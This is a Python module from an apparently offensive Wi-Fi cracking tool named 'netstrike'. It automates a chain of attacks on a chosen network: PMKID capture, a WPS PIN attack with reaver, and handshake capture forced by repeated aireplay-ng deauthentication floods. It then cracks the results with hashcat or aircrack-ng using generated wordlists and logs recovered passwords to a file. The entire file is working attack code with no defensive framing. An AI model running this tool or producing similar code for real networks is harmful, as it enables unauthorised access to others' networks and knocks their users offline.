#!/usr/bin/env python3

import os
import time
import subprocess
import threading
import csv

class PasswordCracker:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.cracking_active = False

    def auto_crack_attack(self):
        """Professional Auto Cracking - VELOCITY CASCADE ENGINE"""
        print("\033[1;36m[→] Starting professional cracking protocol...\033[0m")
        
        # Always fresh scan
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;33m[🎯] Target: {target['essid']}\033[0m")
                print("\033[1;36m[⚡] VELOCITY cascade sequence initiated...\033[0m")
                
                # VELOCITY cascade sequence
                if self.velocity_cascade_sequence(target):
                    return
                
                print("\033[1;31m[✘] All professional methods exhausted\033[0m")

    def velocity_cascade_sequence(self, target):
        """VELOCITY CASCADE cracking sequence"""
        print("\033[1;36m[🔄] Starting VELOCITY cascade attack sequence...\033[0m")
        
        # STEP 1: PMKID Attack (Stealth)
        print("\033[1;36m[1️⃣] STEP 1: PMKID Capture (Client-less)\033[0m")
        if self.professional_pmkid_attack(target):
            return True
        
        # STEP 2: WPS Assessment
        print("\033[1;36m[2️⃣] STEP 2: WPS Vulnerability Assessment\033[0m")
        if self.professional_wps_assessment(target):
            return True
        
        # STEP 3: Handshake Capture + VELOCITY Brute Force
        print("\033[1;36m[3️⃣] STEP 3: Handshake Capture & VELOCITY Brute Force\033[0m")
        if self.professional_handshake_velocity_attack(target):
            return True
        
        return False

    def professional_pmkid_attack(self, target):
        """Professional PMKID attack - STEP 1"""
        print("\033[1;33m[!] Attempting professional PMKID capture...\033[0m")
        
        pmkid_file = f"/tmp/netstrike_pmkid_{target['bssid'].replace(':', '')}"
        
        # Professional PMKID capture
        print("\033[1;36m[→] Capturing PMKID (60 seconds)...\033[0m")
        capture_cmd = f"timeout 60 hcxdumptool -i {self.core.mon_interface} -o {pmkid_file}.pcapng --filterlist={target['bssid']} --filtermode=2 --enable_status=1 > /dev/null 2>&1"
        result = self.core.run_command(capture_cmd)
        
        if os.path.exists(f"{pmkid_file}.pcapng") and os.path.getsize(f"{pmkid_file}.pcapng") > 100:
            print("\033[1;32m[✓] PMKID captured professionally\033[0m")
            
            # Convert to hash format
            convert_cmd = f"hcxpcaptool -z {pmkid_file}.hash {pmkid_file}.pcapng > /dev/null 2>&1"
            self.core.run_command(convert_cmd)
            
            if os.path.exists(f"{pmkid_file}.hash"):
                return self.velocity_pmkid_cracking(f"{pmkid_file}.hash", target)
        
        print("\033[1;31m[✘] PMKID capture failed\033[0m")
        return False

    def velocity_pmkid_cracking(self, hash_file, target):
        """VELOCITY PMKID cracking with Hashcat GPU"""
        wordlists = self.get_professional_wordlists_priority(target['essid'])
        
        # Try Hashcat first (GPU)
        if self.is_hashcat_available():
            print("\033[1;36m[🚀] VELOCITY MODE: Using Hashcat GPU acceleration\033[0m")
            
            for wl_name, wl_path in wordlists.items():
                if wl_path and os.path.exists(wl_path):
                    print(f"\033[1;36m[→] GPU cracking with {wl_name}...\033[0m")
                    
                    # Hashcat PMKID cracking
                    crack_cmd = f"hashcat -m 16800 {hash_file} {wl_path} -O -w 3 --force"
                    result = self.core.run_command(crack_cmd, timeout=300)
                    
                    if result and "Cracked" in result.stdout:
                        print("\033[1;32m[🎉] PMKID cracked successfully with GPU!\033[0m")
                        lines = result.stdout.split('\n')
                        for line in lines:
                            if "Cracked" in line and ":" in line:
                                password = line.split(':')[-1].strip()
                                print(f"\033[1;32m[🔓] PASSWORD: {password}\033[0m")
                                self.save_cracked_password(target, password)
                                return True
        
        # Fallback to CPU
        print("\033[1;33m[⚠️] Hashcat not available, falling back to CPU\033[0m")
        for wl_name, wl_path in wordlists.items():
            if wl_path and os.path.exists(wl_path):
                print(f"\033[1;36m[→] CPU cracking with {wl_name}...\033[0m")
                
                crack_cmd = f"hashcat -m 16800 {hash_file} {wl_path} -O --force -w 3"
                result = self.core.run_command(crack_cmd, timeout=300)
                
                if result and "Cracked" in result.stdout:
                    print("\033[1;32m[🎉] PMKID cracked successfully!\033[0m")
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if "Cracked" in line and ":" in line:
                            password = line.split(':')[-1].strip()
                            print(f"\033[1;32m[🔓] PASSWORD: {password}\033[0m")
                            self.save_cracked_password(target, password)
                            return True
        
        return False

    def is_hashcat_available(self):
        """Check if Hashcat is available for GPU acceleration"""
        result = self.core.run_command("hashcat --version")
        return result and result.returncode == 0

    def professional_wps_assessment(self, target):
        """Professional WPS assessment - STEP 2"""
        print("\033[1;33m[!] Professional WPS vulnerability assessment...\033[0m")
        
        wash_cmd = f"timeout 30 wash -i {self.core.mon_interface} -s -C"
        result = self.core.run_command(wash_cmd)
        
        if result and target['bssid'] in result.stdout:
            print("\033[1;32m[✓] WPS vulnerability detected\033[0m")
            print("\033[1;31m[💣] Launching professional WPS attack...\033[0m")
            
            # Professional WPS attack with reaver
            reaver_proc = self.core.run_command(
                f"reaver -i {self.core.mon_interface} -b {target['bssid']} -c {target['channel']} -vv -K 1 -N -A -d 2 > /tmp/reaver_attack.log 2>&1 &",
                background=True
            )
            
            if reaver_proc:
                print("\033[1;32m[⚡] Professional WPS attack running (5 minutes)\033[0m")
                
                # Monitor for 5 minutes
                start_time = time.time()
                while time.time() - start_time < 300:
                    if os.path.exists("/tmp/reaver_attack.log"):
                        with open("/tmp/reaver_attack.log", "r") as f:
                            content = f.read()
                            if "WPS PIN:" in content:
                                print("\033[1;32m[🎉] WPS PIN found!\033[0m")
                                # Extract PIN and password
                                lines = content.split('\n')
                                for line in lines:
                                    if "WPS PIN:" in line:
                                        pin = line.split("WPS PIN:")[1].strip()
                                        print(f"\033[1;32m[🔑] WPS PIN: {pin}\033[0m")
                                    if "WPA PSK:" in line:
                                        password = line.split("WPA PSK:")[1].strip()
                                        print(f"\033[1;32m[🔓] PASSWORD: {password}\033[0m")
                                        self.save_cracked_password(target, password)
                                        reaver_proc.terminate()
                                        return True
                    time.sleep(5)
                
                reaver_proc.terminate()
                print("\033[1;33m[⚠️] WPS attack timeout\033[0m")
        else:
            print("\033[1;31m[✘] WPS not available\033[0m")
        
        return False

    def professional_handshake_velocity_attack(self, target):
        """Professional handshake capture + VELOCITY brute force - STEP 3"""
        print("\033[1;33m[!] Professional handshake capture & VELOCITY brute force...\033[0m")
        
        handshake_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}"
        
        # Set channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        # Start professional capture
        print("\033[1;36m[→] Professional handshake capture (60 seconds)...\033[0m")
        capture_proc = self.core.run_command(
            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {handshake_file} {self.core.mon_interface} > /dev/null 2>&1 &",
            background=True
        )
        
        # Aggressive deauth to force handshake
        print("\033[1;31m[💣] Aggressive deauth to force handshake...\033[0m")
        deauth_thread = threading.Thread(target=self.aggressive_deauth_attack, args=(target,))
        deauth_thread.daemon = True
        deauth_thread.start()
        
        # Monitor for handshake
        handshake_captured = False
        start_time = time.time()
        while time.time() - start_time < 60 and not handshake_captured:
            if self.check_professional_handshake(f"{handshake_file}-01.cap", target['bssid']):
                handshake_captured = True
                break
            time.sleep(5)
        
        if capture_proc:
            capture_proc.terminate()
        
        if handshake_captured:
            print("\033[1;32m[✓] Professional handshake captured!\033[0m")
            return self.velocity_bruteforce_attack(f"{handshake_file}-01.cap", target)
        else:
            print("\033[1;31m[✘] Handshake capture failed\033[0m")
            return False

    def aggressive_deauth_attack(self, target):
        """Aggressive deauth to force handshake"""
        for i in range(20):  # 20 attempts
            if self.cracking_active:
                break
            self.core.run_command(f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} > /dev/null 2>&1")
            time.sleep(3)

    def velocity_bruteforce_attack(self, cap_file, target):
        """VELOCITY brute force attack with GPU acceleration"""
        print("\033[1;36m[→] Starting VELOCITY brute force attack...\033[0m")
        
        # Convert to hashcat format if available
        hc22000_file = f"/tmp/netstrike_{target['bssid'].replace(':', '')}.hc22000"
        
        if self.is_hashcat_available() and self.convert_to_hc22000(cap_file, hc22000_file, target['bssid']):
            print("\033[1;36m[🚀] VELOCITY MODE: Using Hashcat GPU + Mutation Rules\033[0m")
            return self.hashcat_velocity_attack(hc22000_file, target)
        else:
            print("\033[1;33m[⚠️] Falling back to aircrack-ng CPU\033[0m")
            return self.aircrack_fallback_attack(cap_file, target)

    def convert_to_hc22000(self, cap_file, hc22000_file, bssid):
        """Convert .cap to .hc22000 format for Hashcat"""
        if not self.core.run_command("command -v hcxpcapngtool"):
            return False
        
        convert_cmd = f"hcxpcapngtool -o {hc22000_file} {cap_file} > /dev/null 2>&1"
        result = self.core.run_command(convert_cmd)
        
        return os.path.exists(hc22000_file) and os.path.getsize(hc22000_file) > 0

    def hashcat_velocity_attack(self, hc22000_file, target):
        """Hashcat GPU acceleration with mutation rules"""
        wordlists = self.get_professional_wordlists_priority(target['essid'])
        
        for wl_name, wl_path in wordlists.items():
            if wl_path and os.path.exists(wl_path):
                print(f"\033[1;36m[→] VELOCITY: {wl_name} with mutation rules...\033[0m")
                
                # Try with rules first
                if self.has_hashcat_rules():
                    crack_cmd = f"hashcat -m 22000 {hc22000_file} {wl_path} -r /usr/share/hashcat/rules/best64.rule -O -w 3 --force"
                else:
                    crack_cmd = f"hashcat -m 22000 {hc22000_file} {wl_path} -O -w 3 --force"
                
                result = self.core.run_command(crack_cmd, timeout=600)
                
                if result and "Cracked" in result.stdout:
                    print("\033[1;32m[🎉] PASSWORD CRACKED with VELOCITY ENGINE!\033[0m")
                    # Extract password from hashcat output
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if ":" in line and len(line.split(':')) >= 2:
                            parts = line.split(':')
                            if len(parts) >= 2:
                                password = parts[1].strip()
                                if password and len(password) > 0:
                                    print(f"\033[1;32m[🔓] PASSWORD: {password}\033[0m")
                                    self.save_cracked_password(target, password)
                                    return True
        
        return False

    def has_hashcat_rules(self):
        """Check if Hashcat rules are available"""
        return os.path.exists("/usr/share/hashcat/rules/best64.rule")

    def aircrack_fallback_attack(self, cap_file, target):
        """Fallback to aircrack-ng CPU cracking"""
        wordlists = self.get_professional_wordlists_priority(target['essid'])
        
        for wl_name, wl_path in wordlists.items():
            if wl_path and os.path.exists(wl_path):
                print(f"\033[1;36m[→] Attempting: {wl_name}\033[0m")
                
                result = self.core.run_command(
                    f"aircrack-ng -w {wl_path} -b {target['bssid']} {cap_file} -l /tmp/cracked.txt -q",
                    timeout=600
                )
                
                if os.path.exists("/tmp/cracked.txt"):
                    with open("/tmp/cracked.txt", 'r') as f:
                        password = f.read().strip()
                    print(f"\033[1;32m[🎉] PASSWORD CRACKED: {password}\033[0m")
                    self.save_cracked_password(target, password)
                    return True
                elif result and "KEY FOUND" in result.stdout:
                    # Extract password from aircrack output
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if "KEY FOUND" in line:
                            password = line.split('[')[1].split(']')[0]
                            print(f"\033[1;32m[🎉] PASSWORD: {password}\033[0m")
                            self.save_cracked_password(target, password)
                            return True
        
        return False

    def get_professional_wordlists_priority(self, essid):
        """Get wordlists in priority order"""
        intelligent_wl = self.create_intelligent_wordlist(essid)
        professional_wl = self.get_professional_wordlist()
        rockyou_wl = self.get_rockyou_wordlist()
        common_wl = self.get_common_wordlist()
        
        return {
            "Intelligent Wordlist": intelligent_wl,
            "Professional Wordlist": professional_wl,
            "RockYou": rockyou_wl,
            "Common Passwords": common_wl
        }

    def create_intelligent_wordlist(self, essid):
        """Create intelligent targeted wordlist"""
        wordlist_path = "/tmp/netstrike_intelligent_wordlist.txt"
        
        common_passwords = [
            "12345678", "password", "admin123", "welcome", "qwerty", "letmein",
            "123456789", "password123", "admin", "welcome123", "1234567890",
            "1234", "12345", "123456", "1234567", "internet", "wireless",
            "default", "guest", "linksys", "dlink", "netgear", "cisco", "root"
        ]
        
        # Professional ESSID-based variations
        if essid and essid != "HIDDEN_SSID" and "HIDDEN" not in essid:
            clean_essid = essid.replace('_', '').replace('-', '').replace(' ', '')
            
            variations = [
                essid, essid + "123", essid + "1234", essid + "12345", essid + "2024",
                essid.lower(), essid.upper(), clean_essid, clean_essid + "123",
                essid.replace(' ', ''), essid.replace(' ', '_'), essid.replace(' ', '-'),
                essid + "!", essid + "@", essid + "#", essid + "$"
            ]
            
            common_passwords.extend(variations)
        
        # Remove duplicates
        common_passwords = list(set(common_passwords))
        
        try:
            with open(wordlist_path, 'w') as f:
                for pwd in common_passwords:
                    f.write(pwd + '\n')
            
            return wordlist_path
        except:
            return None

    def get_professional_wordlists(self):
        """Get all available wordlists"""
        return {
            "Intelligent": self.create_intelligent_wordlist(""),
            "Professional": self.get_professional_wordlist(),
            "RockYou": self.get_rockyou_wordlist(),
            "Common": self.get_common_wordlist()
        }

    def get_professional_wordlist(self):
        """Get professional wordlist"""
        pro_path = "/tmp/professional_wordlist.txt"
        
        if not os.path.exists(pro_path):
            # Create professional wordlist
            pro_passwords = [
                "123456", "password", "12345678", "qwerty", "123456789",
                "12345", "1234", "111111", "1234567", "dragon",
                "123123", "baseball", "abc123", "football", "monkey",
                "letmein", "696969", "shadow", "master", "666666",
                "1234567890", "superman", "654321", "1qaz2wsx", "7777777"
            ]
            
            try:
                with open(pro_path, 'w') as f:
                    for pwd in pro_passwords:
                        f.write(pwd + '\n')
            except:
                pass
        
        return pro_path

    def get_rockyou_wordlist(self):
        """Get rockyou wordlist"""
        rockyou_paths = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz", 
            "/tmp/rockyou.txt"
        ]
        
        for path in rockyou_paths:
            if os.path.exists(path):
                if path.endswith('.gz'):
                    # Extract if gzipped
                    self.core.run_command(f"gzip -dc {path} > /tmp/rockyou.txt 2>/dev/null")
                    return "/tmp/rockyou.txt"
                return path
        
        # Try to create a basic one
        self.create_basic_wordlist()
        return "/tmp/common_passwords.txt"

    def get_common_wordlist(self):
        """Get common password wordlist"""
        common_path = "/tmp/common_passwords.txt"
        
        if not os.path.exists(common_path):
            self.create_basic_wordlist()
        
        return common_path

    def create_basic_wordlist(self):
        """Create basic wordlist"""
        common_passwords = [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon", "123123"
        ]
        
        try:
            with open("/tmp/common_passwords.txt", 'w') as f:
                for pwd in common_passwords:
                    f.write(pwd + '\n')
        except:
            pass

    def check_professional_handshake(self, cap_file, bssid):
        """Professional handshake verification"""
        if not os.path.exists(cap_file):
            return False
        
        result = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep '{bssid}'")
        return result and "1 handshake" in result.stdout

    def save_cracked_password(self, target, password):
        """Save cracked password professionally"""
        try:
            with open("/tmp/netstrike_cracked.txt", "a") as f:
                f.write(f"Network: {target['essid']} | BSSID: {target['bssid']} | Password: {password}\n")
            print(f"\033[1;32m[💾] Password saved to: /tmp/netstrike_cracked.txt\033[0m")
        except:
            pass

    def handshake_capture_menu(self):
        """Handshake capture menu"""
        print("\033[1;36m[→] Starting handshake capture protocol...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;33m[🎯] Target: {target['essid']}\033[0m")
                self.professional_handshake_velocity_attack(target)

    def wps_pin_attack(self):
        """Professional WPS PIN attack"""
        print("\033[1;33m[!] Professional WPS network scan...\033[0m")
        
        wash_proc = self.core.run_command(
            f"timeout 30 wash -i {self.core.mon_interface} -C",
            background=True
        )
        
        time.sleep(30)
        
        target_bssid = input("\033[1;33m[?] Enter target BSSID: \033[0m").strip()
        target_channel = input("\033[1;33m[?] Enter target channel: \033[0m").strip()
        
        if target_bssid and target_channel:
            print("\033[1;31m[💣] Professional WPS attack...\033[0m")
            
            self.core.run_command(
                f"reaver -i {self.core.mon_interface} -b {target_bssid} -c {target_channel} -vv -K 1 -N -A > /tmp/reaver_attack.log 2>&1 &",
                background=True
            )
            
            print("\033[1;32m[✅] Professional WPS attack deployed\033[0m")
            print("\033[1;33m[📋] Monitoring /tmp/reaver_attack.log for results...\033[0m")
        else:
            print("\033[1;31m[✘] Invalid target data\033[0m")
